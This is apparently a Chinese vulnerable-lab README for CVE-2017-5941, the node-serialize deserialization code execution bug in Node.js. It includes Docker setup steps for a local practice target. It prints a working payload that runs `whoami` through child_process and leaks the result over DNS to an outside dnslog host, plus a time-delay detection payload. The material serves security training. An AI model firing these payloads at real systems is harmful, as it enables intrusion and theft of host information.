## Node.js node-serialize 反序列化过程代码执行漏洞（CVE-2017-5941）

### 漏洞信息

 * [Exploiting Node.js deserialization bugfor Remote Code Execution(CVE-2017-5941)](https://www.exploit-db.com/docs/41289.pdf)
 * [Node.js 模块 node-serialize 反序列化任意代码执行漏洞](https://www.seebug.org/vuldb/ssvid-92674)

### 漏洞分析

参见漏洞信息原文分析

### 镜像信息

类型 | 路径 | 
:-:|:-:|:-:
Web 路径 | / | 
Web 物理路径 | /htdocs |
Nodejs 路径 | /opt/node/ |

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:n_nodejs_1
 ```

2. 启动环境

 ```
$ docker run -d -p 8000:80 medicean/vulapps:n_nodejs_1
 ```
 > `-p 8000:80` 前面的 8000 代表物理机的端口，可随意指定。 

访问: `http://127.0.0.1:8000/` 出现 Web 登录界面代表成功

### 使用与利用

由于该漏洞无回显（如果使用 throw 方式来回显，有时会造成服务宕机，慎用），所以PoC中提供了通过延时的方式来检测的 PoC。而Exp中采用 DNSLog 形式来得到命令回显


#### Exp 使用

1. 打开Demo站点

 > 该Demo站点是在用户输入密码后将用户名和密码保存在 Cookie 中，下次进入时会通过将Cookie反序列化

2. 在登录框中，任意一个输入框（推荐密码框）处输入如下 Payload, 并点击按钮

 ```
_$$ND_FUNC$$_function (){require('child_process').exec('ping -c 3 `whoami`.`date +%s`.test.dnslog.link')}()
 ```
3. 打开 [DNSLog](http://admin.dnslog.link)，输入账号 `test` 密码 `123456` 进入 test 账号查看执行结果如下：


 - |  host   | type   | date
:-:|:-:|:-:|:-:
74567 | root.1487079354.test.dnslog.link.  | A  | 2017-02-14 21:35:56
74568 |  root.1487079354.test.dnslog.link. |  A  | 2017-02-14 21:35:57

 可以看到`whoami`和`date`命令均被执行，根据结果可知当前用户为 `root`

#### PoC 使用

通过延时的方式来检测的 PoC，适用于不能使用 dnslog 的情况下使用

```
_$$ND_FUNC$$_function (){for(var start = +new Date; +new Date - start <= sleepTime; ) {}}(sleepTime=15000)
```

> 由于 Node.js 中没有 sleep 函数，所以模拟一个

### 参考链接

 * [Exploiting Node.js deserialization bugfor Remote Code Execution(CVE-2017-5941)](https://www.exploit-db.com/docs/41289.pdf)
 * [Node.js 模块 node-serialize 反序列化任意代码执行漏洞](https://www.seebug.org/vuldb/ssvid-92674)
